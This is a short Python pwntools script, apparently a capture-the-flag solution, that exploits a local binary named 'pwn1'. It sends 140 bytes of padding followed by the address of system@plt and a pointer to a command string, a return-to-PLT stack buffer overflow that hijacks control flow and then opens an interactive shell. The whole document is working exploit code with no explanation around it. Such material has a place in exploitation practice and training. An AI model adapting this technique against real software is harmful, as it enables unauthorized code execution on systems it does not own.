from pwn import *


system_plt = 0x080484b0
system_arg = 0x80482ea

offset = 140

payload = 'a'*140+p32(system_plt)+'b'*4+p32(system_arg)

p = process("./pwn1")
p.recvuntil("name:")
p.sendline(payload)
p.recvuntil(":")
#raw_input("debug")
p.sendline("1")

p.interactive()
